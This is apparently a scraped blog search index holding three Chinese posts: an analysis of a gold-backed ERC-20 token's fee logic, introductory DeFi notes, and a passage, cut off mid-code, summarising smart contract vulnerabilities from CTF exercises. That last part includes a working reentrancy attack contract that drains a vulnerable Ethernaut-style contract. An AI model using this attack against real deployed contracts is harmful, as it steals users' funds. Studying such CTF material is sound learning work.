balance.mul(TOKEN).mul(daysSinceStoragePaid).div(YEAR).div(STORAGE_FEE_DENOMINATOR);\n    if (fee > balance) &#123;\n      return balance;\n    &#125;\n    return fee;\n  &#125;\n  /**\n   * @dev Approve an address to spend another addresses' tokens.\n   * @param owner The address that owns the tokens.\n   * @param spender The address that will spend the tokens.\n   * @param value The number of tokens that can be spent.\n   */\n  function _approve(address owner, address spender, uint256 value) internal &#123;\n    require(spender != address(0));\n    require(owner != address(0));\n    _allowances[owner][spender] = value;\n    emit Approval(owner, spender, value);\n  &#125;\n  /**\n  * @dev Transfer token for a specified addresses. Transfer is modified from a\n  * standard ERC20 contract in that it must also process transfer and storage fees\n  * for the token itself. Additionally there are certain internal addresses that\n  * are not subject to fees.\n  * @param from The address to transfer from.\n  * @param to The address to transfer to.\n  * @param value The amount to be transferred.\n  */\n  function _transfer(address from, address to, uint256 value) internal &#123;\n    _transferRestrictions(to, from);\n    // If the account was previously inactive and initiated the transfer, the\n    // inactive fees and storage fees have already been paid by the time we get here\n    // via the _updateActivity() call\n    uint256 storageFeeFrom = calcStorageFee(from);\n    uint256 storageFeeTo = 0;\n    uint256 allFeeFrom = storageFeeFrom;\n    uint256 balanceFromBefore = _balances[from];\n    uint256 balanceToBefore = _balances[to];\n    // If not sending to self can pay storage and transfer fee\n    if (from != to) &#123;\n      // Need transfer fee and storage fee for receiver if not sending to self\n      allFeeFrom = allFeeFrom.add(calcTransferFee(from, value));\n      storageFeeTo = calcStorageFee(to);\n      _balances[from] = balanceFromBefore.sub(value).sub(allFeeFrom);\n      _balances[to] = balanceToBefore.add(value).sub(storageFeeTo);\n      _balances[_feeAddress] = _balances[_feeAddress].add(allFeeFrom).add(storageFeeTo);\n    &#125; else &#123;\n      // Only storage fee if sending to self\n      _balances[from] = balanceFromBefore.sub(storageFeeFrom);\n      _balances[_feeAddress] = _balances[_feeAddress].add(storageFeeFrom);\n    &#125;\n    // Regular Transfer\n    emit Transfer(from, to, value);\n    // Fee transfer on `from` address\n    if (allFeeFrom > 0) &#123;\n      emit Transfer(from, _feeAddress, allFeeFrom);\n      if (storageFeeFrom > 0) &#123;\n        _timeStorageFeePaid[from] = block.timestamp;\n        _endGracePeriod(from);\n      &#125;\n    &#125;\n    // If first time receiving coins, set the grace period\n    // and start the the activity clock and storage fee clock\n    if (_timeStorageFeePaid[to] == 0) &#123;\n      // We may change the grace period in the future so we want to\n      // preserve it per address so there is no retroactive deduction\n      _storageFeeGracePeriod[to] = _storageFeeGracePeriodDays;\n      _timeLastActivity[to] = block.timestamp;\n      _timeStorageFeePaid[to] = block.timestamp;\n    &#125;\n    // Fee transfer on `to` address\n    if (storageFeeTo > 0) &#123;\n      emit Transfer(to, _feeAddress, storageFeeTo);\n      _timeStorageFeePaid[to] = block.timestamp;\n      _endGracePeriod(to);\n    &#125; else if (balanceToBefore &lt; MIN_BALANCE_FOR_FEES) &#123;\n      // MIN_BALANCE_FOR_FEES is the minimum amount in which a storage fee\n      // would be due after a sigle day, so if the balance is above that,\n      // the storage fee would always be greater than 0.\n      //\n      // This avoids the following condition:\n      // 1. User receives tokens\n      // 2. Users sends all but a tiny amount to another address\n      // 3. A year later, the user receives more tokens. Because\n      // their previous balance was super small, there were no appreciable\n      // storage fee, therefore the storage fee clock was not reset\n      // 4. User now owes storage fees on entire balance, as if they\n      // held tokens for 1 year, instead of resetting the clock to now.\n      _timeStorageFeePaid[to] = block.timestamp;\n    &#125;\n    // If transferring to unbacked treasury, tokens are being taken from\n    // circulation, because gold is being 'unlocked' from the vault\n    if (to == _unbackedTreasury) &#123;\n      emit RemoveGold(value);\n    &#125;\n  &#125;\n  /**\n  * @dev Function to mint tokens to backed treasury. In general this method\n  * will not be called on it's own, but instead will be called from\n  * addBackedTokens.\n  * @param value The amount of tokens to mint to backed treasury\n  * @return A boolean that indicates if the operation was successful.\n  */\n  function _mint(uint256 value) internal returns(bool) &#123;\n    // Can't break supply cap\n    require(_totalSupply.add(value) &lt;= SUPPLY_CAP, \"Call would exceed supply cap\");\n    // Can only mint if the unbacked treasury balance is 0\n    require(_balances[_unbackedTreasury] == 0, \"The unbacked treasury balance is not 0\");\n    // Can only mint to the backed treasury\n    _totalSupply = _totalSupply.add(value);\n    _balances[_backedTreasury] = _balances[_backedTreasury].add(value);\n    emit Transfer(address(0), _backedTreasury, value);\n    return true;\n  &#125;\n  /**\n   * @dev Apply storage fee deduction\n   * @param account The account to pay storage fees\n   * @return A uint256 representing the storage fee paid\n   */\n  function _payStorageFee(address account) internal returns(uint256) &#123;\n    uint256 storeFee = calcStorageFee(account);\n    if (storeFee == 0) &#123;\n      return 0;\n    &#125;\n    // Reduce account balance and add to fee address\n    _balances[account] = _balances[account].sub(storeFee);\n    _balances[_feeAddress] = _balances[_feeAddress].add(storeFee);\n    emit Transfer(account, _feeAddress, storeFee);\n    _timeStorageFeePaid[account] = block.timestamp;\n    _endGracePeriod(account);\n    return storeFee;\n  &#125;\n  /**\n   * @dev Apply inactive fee deduction\n   * @param account The account to pay inactive fees\n   * @return A uint256 representing the inactive fee paid\n   */\n  function _payInactiveFee(address account) internal returns(uint256) &#123;\n    uint256 fee = _calcInactiveFee(\n        _balances[account],\n        daysSinceActivity(account),\n        _inactiveFeePerYear[account],\n        _inactiveFeePaid[account]);\n    if (fee == 0) &#123;\n      return 0;\n    &#125;\n    _balances[account] = _balances[account].sub(fee);\n    _balances[_feeAddress] = _balances[_feeAddress].add(fee);\n    _inactiveFeePaid[account] = _inactiveFeePaid[account].add(fee);\n    emit Transfer(account, _feeAddress, fee);\n    return fee;\n  &#125;\n  function _shouldMarkInactive(address account) internal view returns(bool) &#123;\n    // Can only mark an account as inactive if\n    //\n    // 1. it's not fee exempt\n    // 2. it has a balance\n    // 3. it's been over INACTIVE_THRESHOLD_DAYS since last activity\n    // 4. it's not already marked inactive\n    // 5. the storage fees owed already consume entire balance\n    if (account != address(0) &amp;&amp;\n        _balances[account] > 0 &amp;&amp;\n        daysSinceActivity(account) >= INACTIVE_THRESHOLD_DAYS &amp;&amp;\n        !isInactive(account) &amp;&amp;\n        !isAllFeeExempt(account) &amp;&amp;\n        _balances[account].sub(calcStorageFee(account)) > 0) &#123;\n      return true;\n    &#125;\n    return false;\n  &#125;\n  /**\n  * @dev Mark an account as inactive. The function will automatically deduct\n  * owed storage fees and inactive fees in one go.\n  *\n  * @param account The account to mark inactive\n  */\n  function _setInactive(address account) internal &#123;\n    // First get owed storage fees\n    uint256 storeFee = calcStorageFee(account);\n    uint256 snapshotBalance = _balances[account].sub(storeFee);\n    // all _setInactive calls are wrapped in _shouldMarkInactive, which\n    // already checks this, so we shouldn't hit this condition\n    assert(snapshotBalance > 0);\n    // Set the account inactive on deducted balance\n    _inactiveFeePerYear[account] = _calcInactiveFeePerYear(snapshotBalance);\n    emit AccountInactive(account, _inactiveFeePerYear[account]);\n    uint256 inactiveFees = _calcInactiveFee(snapshotBalance,\n                                            daysSinceActivity(account),\n                                            _inactiveFeePerYear[account],\n                                            0);\n    // Deduct owed storage and inactive fees\n    uint256 fees = storeFee.add(inactiveFees);\n    _balances[account] = _balances[account].sub(fees);\n    _balances[_feeAddress] = _balances[_feeAddress].add(fees);\n    _inactiveFeePaid[account] = _inactiveFeePaid[account].add(inactiveFees);\n    emit Transfer(account, _feeAddress, fees);\n    // Reset storage fee clock if storage fees paid\n    if (storeFee > 0) &#123;\n      _timeStorageFeePaid[account] = block.timestamp;\n      _endGracePeriod(account);\n    &#125;\n  &#125;\n  /**\n  * @dev Update the activity clock on an account thats originated a transaction.\n  * If the account has previously been marked inactive or should have been\n  * marked inactive, it will opportunistically collect those owed fees.\n  *\n  * @param account The account to update activity\n  */\n  function _updateActivity(address account) internal &#123;\n    // Cache has the ability to force collecting storage and inactivity fees,\n    // but in the event an address was missed, can we still detect if the\n    // account was inactive when they next transact\n    //\n    // Here we simply set the account as being inactive, collect the previous\n    // storage and inactive fees that were owed, and then reactivate the account\n    if (_shouldMarkInactive(account)) &#123;\n      // Call will pay existing storage fees before marking inactive\n      _setInactive(account);\n    &#125;\n    // Pay remaining fees and reset fee clocks\n    if (isInactive(account)) &#123;\n      _payInactiveFee(account);\n      _inactiveFeePerYear[account] = 0;\n      _timeStorageFeePaid[account] = block.timestamp;\n      emit AccountReActive(account);\n    &#125;\n    // The normal case will just hit this and update\n    // the activity clock for the account\n    _timeLastActivity[account] = block.timestamp;\n  &#125;\n  /**\n   * @dev Turn off storage fee grace period for an address the first\n   * time storage fees are paid (after grace period has ended)\n   * @param account The account to turn off storage fee grace period\n   */\n  function _endGracePeriod(address account) internal &#123;\n    if (_storageFeeGracePeriod[account] > 0) &#123;\n      _storageFeeGracePeriod[account] = 0;\n    &#125;\n  &#125;\n  /**\n  * @dev Enforce the rules of which addresses can transfer to others\n  * @param to The sending address\n  * @param from The receiving address\n  */\n  function _transferRestrictions(address to, address from) internal view &#123;\n    require(from != address(0));\n    require(to != address(0));\n    require(to != address(this), \"Cannot transfer tokens to the contract\");\n    // unbacked treasury can only transfer to backed treasury\n    if (from == _unbackedTreasury) &#123;\n      require(to == _backedTreasury,\n              \"Unbacked treasury can only transfer to backed treasury\");\n    &#125;\n    // redeem address can only transfer to unbacked or backed treasury\n    if (from == _redeemAddress) &#123;\n      require((to == _unbackedTreasury) || (to == _backedTreasury),\n              \"Redeem address can only transfer to treasury\");\n    &#125;\n    // Only the backed treasury  and redeem address\n    // can transfer to unbacked treasury\n    if (to == _unbackedTreasury) &#123;\n      require((from == _backedTreasury) || (from == _redeemAddress),\n              \"Unbacked treasury can only receive from redeem address and backed treasury\");\n    &#125;\n    // Only the unbacked treasury can transfer to the backed treasury\n    if (to == _backedTreasury) &#123;\n      require((from == _unbackedTreasury) || (from == _redeemAddress),\n              \"Only unbacked treasury and redeem address can transfer to backed treasury\");\n    &#125;\n  &#125;\n  /**\n   * @dev Simulate the transfer from one address to another see final balances and associated fees\n   * @param from address The address which you want to send tokens from\n   * @param to address The address which you want to transfer to\n   * @return a uint256 array of 5 values representing the\n   * [0] storage fees `from`\n   * [1] storage fees `to`\n   * [2] transfer fee `from`\n   * [3] final `from` balance\n   * [4] final `to` balance\n   */\n  function _simulateTransfer(address from, address to, uint256 value) internal view returns (uint256[5] memory) &#123;\n    uint256[5] memory ret;\n    // Return value slots\n    // 0 - fees `from`\n    // 1 - fees `to`\n    // 2 - transfer fee `from`\n    // 3 - final `from` balance\n    // 4 - final `to` balance\n    ret[0] = calcOwedFees(from);\n    ret[1] = 0;\n    ret[2] = 0;\n    // Don't double charge storage fee sending to self\n    if (from != to) &#123;\n      ret[1] = calcOwedFees(to);\n      ret[2] = calcTransferFee(from, value);\n      ret[3] = _balances[from].sub(value).sub(ret[0]).sub(ret[2]);\n      ret[4] = _balances[to].add(value).sub(ret[1]);\n    &#125; else &#123;\n      ret[3] = _balances[from].sub(ret[0]);\n      ret[4] = ret[3];\n    &#125;\n    return ret;\n  &#125;\n  /**\n  * @dev Calculate the amount of inactive fees due per year on the snapshot balance.\n  * Should return 50 basis points or 1 token minimum.\n  *\n  * @param snapshotBalance The balance of the account when marked inactive\n  * @return uint256 the inactive fees due each year\n  */\n  function _calcInactiveFeePerYear(uint256 snapshotBalance) internal pure returns(uint256) &#123;\n    uint256 inactiveFeePerYear = snapshotBalance.mul(TOKEN).div(INACTIVE_FEE_DENOMINATOR);\n    if (inactiveFeePerYear &lt; TOKEN) &#123;\n      return TOKEN;\n    &#125;\n    return inactiveFeePerYear;\n  &#125;\n  /**\n  * @dev Calcuate inactive fees due on an account\n  * @param balance The current account balance\n  * @param daysInactive The number of days the account has been inactive\n  * @param feePerYear The inactive fee per year based on snapshot balance\n  * @param paidAlready The amount of inactive fees that have been paid already\n  * @return uint256 for inactive fees due\n  */\n  function _calcInactiveFee(uint256 balance,\n                        uint256 daysInactive,\n                        uint256 feePerYear,\n                        uint256 paidAlready) internal pure returns(uint256) &#123;\n    uint256 daysDue = daysInactive.sub(INACTIVE_THRESHOLD_DAYS);\n    uint256 totalDue = feePerYear.mul(TOKEN).mul(daysDue).div(YEAR).div(TOKEN).sub(paidAlready);\n    // The fee per year can be off by 0.00000001 so we can collect\n    // the final dust after 200 years\n    if (totalDue > balance || balance.sub(totalDue) &lt;= 200) &#123;\n      return balance;\n    &#125;\n    return totalDue;\n  &#125;\n&#125;\n\nAnalyze本质上属于ERC-20 token具备其基本功能，但又额外有一些自身的特点，下文进行分析\nfunction addBackedTokens(uint256 value) external onlyOwner returns (bool)\n  &#123;\n    uint256 unbackedBalance = _balances[_unbackedTreasury];\n    uint256 lockedGrams =  LockedGoldOracle(_oracle).lockedGold();\n    require(lockedGrams >= totalCirculation().add(value),\n            \"Insufficent grams locked in LockedGoldOracle to complete operation\");\n    if (value &lt;= unbackedBalance) &#123;\n      _transfer(_unbackedTreasury, _backedTreasury, value);\n    &#125; else &#123;\n      if (unbackedBalance > 0) &#123;\n        _transfer(_unbackedTreasury, _backedTreasury, unbackedBalance);\n      &#125;\n      _mint(value.sub(unbackedBalance));\n    &#125;\n    emit AddBackedGold(value);\n    return true;\n  &#125;\n  function payStorageFee() external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _payStorageFee(msg.sender);\n    return true;\n  &#125;\n\n该函数实现了铸造token的功能（注意unbackedTreasury内的代币只可以转账到backedTreasury），从而即可增加backedTreasury地址下的token数量，如果unbackedTreasury余额不足将全部转出在进行mint\nfunction payStorageFee() external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _payStorageFee(msg.sender);\n    return true;\n  &#125;\n\n此函数实现了支付StorageFee的功能\n下边是一大堆的关于set函数，比较简单这里就不说了\nfunction forcePayFees(address account) external onlyEnforcer returns(bool) &#123;\n   require(account != address(0));\n   require(_balances[account] > 0,\n           \"Account has no balance, cannot force paying fees\");\n   if (isInactive(account)) &#123;\n     uint256 paid = _payInactiveFee(account);\n     require(paid > 0);\n   &#125; else if (_shouldMarkInactive(account)) &#123;\n     _setInactive(account);\n   &#125; else &#123;\n     require(daysSincePaidStorageFee(account) >= YEAR,\n             \"Account has paid storage fees more recently than 365 days\");\n     uint256 paid = _payStorageFee(account);\n     require(paid > 0, \"No appreciable storage fees due, will refund gas\");\n   &#125;\n &#125;\n\n强制执行支付手续费操作，只有Enforcer可以调用这个方法，不活跃账户就支付InactiveFee，否则支付StorageFee，elif则是检测账户是否需要被标记为不活跃账户，如果需要就会在setInactive函数下将账户设置为不活跃账户，同时扣除掉两种费用\nfunction calcStorageFee(address account) public view returns(uint256) &#123;\n    uint256 balance = _balances[account];\n    if (isInactive(account) || isStorageFeeExempt(account) || balance == 0) &#123;\n      return 0;\n    &#125;\n    uint256 daysSinceStoragePaid = daysSincePaidStorageFee(account);\n    uint256 daysInactive = daysSinceActivity(account);\n    uint256 gracePeriod = _storageFeeGracePeriod[account];\n    if (gracePeriod > 0) &#123;\n      if (daysSinceStoragePaid > gracePeriod) &#123;\n        daysSinceStoragePaid = daysSinceStoragePaid.sub(gracePeriod);\n      &#125; else &#123;\n        daysSinceStoragePaid = 0;\n      &#125;\n    &#125;\n    if (daysSinceStoragePaid == 0) &#123;\n      return 0;\n    &#125;\n    if (daysInactive >= INACTIVE_THRESHOLD_DAYS) &#123;\n      daysSinceStoragePaid = daysSinceStoragePaid.sub(daysInactive.sub(INACTIVE_THRESHOLD_DAYS));\n    &#125;\n    return storageFee(balance, daysSinceStoragePaid);\n  &#125;\n  function storageFee(uint256 balance, uint256 daysSinceStoragePaid) public pure returns(uint256) &#123;\n    uint256 fee = balance.mul(TOKEN).mul(daysSinceStoragePaid).div(YEAR).div(STORAGE_FEE_DENOMINATOR);\n    if (fee > balance) &#123;\n      return balance;\n    &#125;\n    return fee;\n  &#125;\n\n以上两个函数的配合达到了计算storageFee的功能，并设置有宽限期，再宽限期内距离上次支付storageFee的时间为0，再宽限期外，将为时间间隔减去宽限期，再将balance，daysSinceStoragePaid作为参数传递给storageFee()函数（拖欠越久，storageFee越高，直到余额总数）\nfunction _calcInactiveFeePerYear(uint256 snapshotBalance) internal pure returns(uint256) &#123;\n   uint256 inactiveFeePerYear = snapshotBalance.mul(TOKEN).div(INACTIVE_FEE_DENOMINATOR);\n   if (inactiveFeePerYear &lt; TOKEN) &#123;\n     return TOKEN;\n   &#125;\n   return inactiveFeePerYear;\n &#125;\n function _calcInactiveFee(uint256 balance,\n                       uint256 daysInactive,\n                       uint256 feePerYear,\n                       uint256 paidAlready) internal pure returns(uint256) &#123;\n   uint256 daysDue = daysInactive.sub(INACTIVE_THRESHOLD_DAYS);\n   uint256 totalDue = feePerYear.mul(TOKEN).mul(daysDue).div(YEAR).div(TOKEN).sub(paidAlready);\n   if (totalDue > balance || balance.sub(totalDue) &lt;= 200) &#123;\n     return balance;\n   &#125;\n   return totalDue;\n &#125;\n\ncalcInactiveFee()函数调用如上两个函数计算InactiveFee\nfunction _updateActivity(address account) internal &#123;\n   if (_shouldMarkInactive(account)) &#123;\n     _setInactive(account);\n   &#125;\n   if (isInactive(account)) &#123;\n     _payInactiveFee(account);\n     _inactiveFeePerYear[account] = 0;\n     _timeStorageFeePaid[account] = block.timestamp;\n     emit AccountReActive(account);\n   &#125;\n   _timeLastActivity[account] = block.timestamp;\n &#125;\n\n合约在用户任何一次调用函数进行交易时候会进行_updateActivity(msg.sender)操作更新活跃性，记录下本次交易时间\n合约实现了在转账时扣除一定的手续费的功能，代码如下，有StorageFee和transferfee。存在有免手续费地址，即transferFeeExempt和storageFeeExempt\nfunction _transfer(address from, address to, uint256 value) internal &#123;\n   _transferRestrictions(to, from);\n   // If the account was previously inactive and initiated the transfer, the\n   // inactive fees and storage fees have already been paid by the time we get here\n   // via the _updateActivity() call\n   uint256 storageFeeFrom = calcStorageFee(from);\n   uint256 storageFeeTo = 0;\n   uint256 allFeeFrom = storageFeeFrom;\n   uint256 balanceFromBefore = _balances[from];\n   uint256 balanceToBefore = _balances[to];\n   // If not sending to self can pay storage and transfer fee\n   if (from != to) &#123;\n     // Need transfer fee and storage fee for receiver if not sending to self\n     allFeeFrom = allFeeFrom.add(calcTransferFee(from, value));\n     storageFeeTo = calcStorageFee(to);\n     _balances[from] = balanceFromBefore.sub(value).sub(allFeeFrom);\n     _balances[to] = balanceToBefore.add(value).sub(storageFeeTo);\n     _balances[_feeAddress] = _balances[_feeAddress].add(allFeeFrom).add(storageFeeTo);\n   &#125; else &#123;\n     // Only storage fee if sending to self\n     _balances[from] = balanceFromBefore.sub(storageFeeFrom);\n     _balances[_feeAddress] = _balances[_feeAddress].add(storageFeeFrom);\n   &#125;\n   // Regular Transfer\n   emit Transfer(from, to, value);\n   // Fee transfer on `from` address\n   if (allFeeFrom > 0) &#123;\n     emit Transfer(from, _feeAddress, allFeeFrom);\n     if (storageFeeFrom > 0) &#123;\n       _timeStorageFeePaid[from] = block.timestamp;\n       _endGracePeriod(from);\n     &#125;\n   &#125;\n   // If first time receiving coins, set the grace period\n   // and start the the activity clock and storage fee clock\n   if (_timeStorageFeePaid[to] == 0) &#123;\n     // We may change the grace period in the future so we want to\n     // preserve it per address so there is no retroactive deduction\n     _storageFeeGracePeriod[to] = _storageFeeGracePeriodDays;\n     _timeLastActivity[to] = block.timestamp;\n     _timeStorageFeePaid[to] = block.timestamp;\n   &#125;\n   // Fee transfer on `to` address\n   if (storageFeeTo > 0) &#123;\n     emit Transfer(to, _feeAddress, storageFeeTo);\n     _timeStorageFeePaid[to] = block.timestamp;\n     _endGracePeriod(to);\n   &#125; else if (balanceToBefore &lt; MIN_BALANCE_FOR_FEES) &#123;\n     // MIN_BALANCE_FOR_FEES is the minimum amount in which a storage fee\n     // would be due after a sigle day, so if the balance is above that,\n     // the storage fee would always be greater than 0.\n     //\n     // This avoids the following condition:\n     // 1. User receives tokens\n     // 2. Users sends all but a tiny amount to another address\n     // 3. A year later, the user receives more tokens. Because\n     // their previous balance was super small, there were no appreciable\n     // storage fee, therefore the storage fee clock was not reset\n     // 4. User now owes storage fees on entire balance, as if they\n     // held tokens for 1 year, instead of resetting the clock to now.\n     _timeStorageFeePaid[to] = block.timestamp;\n   &#125;\n   // If transferring to unbacked treasury, tokens are being taken from\n   // circulation, because gold is being 'unlocked' from the vault\n   if (to == _unbackedTreasury) &#123;\n     emit RemoveGold(value);\n   &#125;\n &#125;\n  function _transferRestrictions(address to, address from) internal view &#123;\n   require(from != address(0));\n   require(to != address(0));\n   require(to != address(this), \"Cannot transfer tokens to the contract\");\n   if (from == _unbackedTreasury) &#123;\n     require(to == _backedTreasury,\n             \"Unbacked treasury can only transfer to backed treasury\");\n   &#125;\n   if (from == _redeemAddress) &#123;\n     require((to == _unbackedTreasury) || (to == _backedTreasury),\n             \"Redeem address can only transfer to treasury\");\n   &#125;\n   if (to == _unbackedTreasury) &#123;\n     require((from == _backedTreasury) || (from == _redeemAddress),\n             \"Unbacked treasury can only receive from redeem address and backed treasury\");\n   &#125;\n   if (to == _backedTreasury) &#123;\n     require((from == _unbackedTreasury) || (from == _redeemAddress),\n             \"Only unbacked treasury and redeem address can transfer to backed treasury\");\n   &#125;\n &#125;\n\ntransfer函数配合_transferRestrictions函数实现了手续费的扣除，以及对转账操作的限制（限制了unbackedTreasury，redeemAddress以及unbackedTreasury地址下的token的来，去）同时实现了activity的更新，宽限期的结束等功能\nfunction _simulateTransfer(address from, address to, uint256 value) internal view returns (uint256[5] memory) &#123;\n    uint256[5] memory ret;\n    ret[0] = calcOwedFees(from);\n    ret[1] = 0;\n    ret[2] = 0;\n    if (from != to) &#123;\n      ret[1] = calcOwedFees(to);\n      ret[2] = calcTransferFee(from, value);\n      ret[3] = _balances[from].sub(value).sub(ret[0]).sub(ret[2]);\n      ret[4] = _balances[to].add(value).sub(ret[1]);\n    &#125; else &#123;\n      ret[3] = _balances[from].sub(ret[0]);\n      ret[4] = ret[3];\n    &#125;\n    return ret;\n  &#125;\n\n模拟转账功能，feom!&#x3D;to就是加减对应的fee以及转账value，否则就是直接扣除对应fee\nfunction calcSendAllBalance(address account) public view returns (uint256) &#123;\n   require(account != address(0));\n   uint256 balanceAfterStorage = _balances[account].sub(calcOwedFees(account));\n   if (_transferFeeBasisPoints == 0 || isTransferFeeExempt(account)) &#123;\n     return balanceAfterStorage;\n   &#125;\n   if (balanceAfterStorage &lt;= 1) &#123;\n     return 0;\n   &#125;\n   uint256 divisor = TOKEN.add(_transferFeeBasisPoints.mul(BASIS_POINTS_MULTIPLIER));\n   uint256 sendAllAmount = balanceAfterStorage.mul(TOKEN).div(divisor).add(1);\n   uint256 transFee = sendAllAmount.mul(_transferFeeBasisPoints).div(BASIS_POINTS_MULTIPLIER);\n   if (sendAllAmount.add(transFee) > balanceAfterStorage) &#123;\n     return sendAllAmount.sub(1);\n   &#125;\n   return sendAllAmount;\n &#125;\n\n计算余额，transferFeeBasisPoints为0以及isTransferFeeExempt的情况下，余额就是当前余额减去对应的fee，其他情况下对应公式进行计算。\n","slug":"learn of token","date":"2022-08-01T11:07:30.271Z","categories_index":"","tags_index":"区块链 ctf","author_index":"bcYng"},{"id":"ffdc2c15bd4d362ddf4d91f867ac761d","title":"Learn of Defi","content":"1.Defi\nWHAT？金融基础设施作为建立在公共智能合约平台上的开放、无需许可且高度可互操作的协议栈\n\nWHY？Defi ‘s advantage: \n\n开源系统；建立在无需许可的区块链\n任何人都可以在不经过第三方允许的情况下使用&#x2F;互操作或在上面构建\n用户无需提供真实身份\n没有单个实体负责升级决策和管理员权限\n资产不受单一第三方托管\n\n相比于传统Traditional finance（Cefi）避免了以下问题:\n\n账户资产及可被冻结\n交易中介可以审查交易并且收取费用\n客户对于服务提供商没有隐私，服务者知道客户的真实身份和完整的账户&#x2F;交易信息\n不透明、孤立的数据库和应用程序（在Defi中数据公开透明）\n\n\n\n需要被信任才能正确安全地运行\n\n2.BlockchainWHAT?分为如下四层：\nlayer4：user facing tools (cloud servers)\nlayer3：applications (DAPPs, smart contracts)\nlayer2：compute layer (blockchain computer)\nlayer1：consensus layer\nconsensus layer：\n持久性：一旦添加，数据将永远无法删除\n共识性：所有诚实的参与者拥有相同的数据\n活跃性：诚实的参与者可以添加新的交易\n开放性：任何人都可以添加数据\nCompute layer：\nDAPP 逻辑被编码在区块链上运行的程序中规则由公共程序执行（公共源代码）\n没有单一的受信任的第三者\nDAPP程序由创建新区块的各方执行公共可验证性：每个人都可以验证交易状态\nApplications  layer：\nDAPPs，smart contracts\nuser facing tools layer：\n\n3.smart contractsWHATThey’re neither smart nor contracts! Developer’s perspective: Program objects on the blockchain\nSzabo 于 1994 年提出的“智能合约”\n智能合约是一种计算机化交易协议执行合同条款。总体目标是满足共同的合同条件（例如付款条款、留置权、保密性和甚至强制执行），最大限度地减少恶意和偶然的，并最大限度地减少对受信任的需求中介。相关的经济目标包括降低欺诈损失、仲裁和执行费用，以及其他交易成本。\n合约类：为一个合约定义程序代码和存储变量合同\n合约对象：存在于区块链上的类的一个实例\n存储字段：合约存储的变量\n函数&#x2F;方法：可以调用来运行给定的代码，更新合同状态\n访问控制：如果不是，使用“require()”取消交易授权。您可以检查调用该函数的调用者\n组合：多个合约之间的交互\n4.DEXWHAT去中心化交易平台（DEX）是点对点的交易市场，用户可以绕过中间方直接交易和管理cryptocurrency。DEX可以替代银行、券商、支付系统等传统中介，使用区块链智能合约来交易资产。\n传统金融交易流程往往缺乏透明性，需要依靠中介执行，而且中介的许多操作都不对外公开。相比之下，DEX完全公开资金流向和交易机制。另外，由于交易中用户资金不会经过第三方的cryptocurrency钱包，因此DEX可以降低cryptocurrency生态中的对手方风险以及系统性的中心化风险\nDEX是去中心化金融（DeFi）的基石，也是不可或缺的一块“货币乐高”，具有无需许可的可组合性，并可以打造出更加高级的金融产品。\nWHYDEX 具有更高的安全性，因为无法由于没有中央集权，政府和监管更难控制他们的访问者。 此外，CEX 经常限制某些国家用户使用他们的服务。 对DEX问题，因为世界上任何地方都有互联网连接的任何人都可以使用它们。 这创建了一个更公平的访问系统。\n5.On chain lending&amp;borrowHOW\n抵押品\n用作保证金的资产\n超额抵押\n借款人必须提供价值（抵押资产）&gt; 价值（授予的贷款）\n抵押不足\n即价值（抵押品）&lt; 价值（债务）\n清算\n如果价值（抵押品）&lt;&#x3D; 150% * 价值（债务），则任何人可以清算债务头寸\n健康因子\n\n当健康因子下跌到1以下，借款头寸将会被清算\n6.OracleWHAT实际上DeFi使用的工具是去中心化的，为了保持这种状态，它们使用的数据不能由中心化的来源提供，因为中心化的来源可能会伪造、篡改、修改或隐藏信息。此外，它们所基于的智能合约只存在于区块链上，并且只能访问区块链本身的可用数据。\n预言机就是一种很好的解决办法，DeFi协议智能合约将预言机作为区块链之外的数据来源，例如资产市场价格、体育赛事结果、天气数据或任何其他在区块链上无法获得的信息。 \n预言机被认为是去中心化协议和区块链外部数据之间的桥梁，简单来说就是承接内部和外部之间的数据交换，这也是为什么预言机是Defi概念里面必不可少的一个原因。\n","slug":"Learn-the-mooc-of-Dawn-song","date":"2022-08-01T11:05:08.276Z","categories_index":"","tags_index":"区块链 ctf","author_index":"bcYng"},{"id":"ffa4ad3cb02d93d241db5e33b2dfae61","title":"Smart Contract Basic Vulnerability Summary","content":"1.关于转账的漏洞在solidity中有三种转账方式，分别是call，transfer和send，后两者相对安全，但也分别对应着漏洞。\ncall转账漏洞——重入例子：\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Reentrance &#123;\n  \n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable &#123;\n    balances[_to] = balances[_to].add(msg.value);\n  &#125;\n\n  function balanceOf(address _who) public view returns (uint balance) &#123;\n    return balances[_who];\n  &#125;\n\n  function withdraw(uint _amount) public &#123;\n    if(balances[msg.sender] >= _amount) &#123;\n      (bool result,) = msg.sender.call&#123;value:_amount&#125;(\"\");\n      if(result) &#123;\n        _amount;\n      &#125;\n      balances[msg.sender] -= _amount;\n    &#125;\n  &#125;\n\n  receive() external payable &#123;&#125;\n&#125;\n\n原理：call转账会调用所有的gas，并且转账出现异常之后不会抛出异常而是返回false\n漏洞分析：经典的重入漏洞，使用了call转账，并且balances[msg.sender]在转账完成之后才进行更新，所以构造攻击合约中的fallback触发即可\ncontract attack&#123;\n    test constant private target=test(0xEdBA908c98185b82b1aBb31AFAF66B2f415491B2);\n    function cunqian() public payable&#123;\n        target.donate&#123;value: 0.001 ether&#125;(address(this));\n    &#125;\n    function tuiqian()public&#123;\n        target.withdraw(0.001 ether);\n    &#125;\n    function check() public view returns(uint)&#123;\n        return address(this).balance;\n    &#125;\n    fallback() external payable&#123;\n        if(address(0xEdBA908c98185b82b1aBb31AFAF66B2f415491B2).balance>=0.001 ether)\n        target.withdraw(0.001 ether);\n    &#125;\n     function reuse() public &#123;\n        msg.sender.transfer(address(this).balance);\n    &#125;\n&#125;\n\n相应例题：\nethernaut——re-entrancy https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D\ncapture the ether——Token bank\nhttps://capturetheether.com/challenges/miscellaneous/token-bank/\ntransfer转账漏洞——拒绝服务例子：\npragma solidity ^0.6.0;\n\ncontract King &#123;\n\n  address payable king;\n  uint public prize;\n  address payable public owner;\n\n  constructor() public payable &#123;\n    owner = msg.sender;  \n    king = msg.sender;\n    prize = msg.value;\n  &#125;\n\n  receive() external payable &#123;\n    require(msg.value >= prize || msg.sender == owner);\n    king.transfer(msg.value);\n    king = msg.sender;\n    prize = msg.value;\n  &#125;\n\n  function _king() public view returns (address payable) &#123;\n    return king;\n  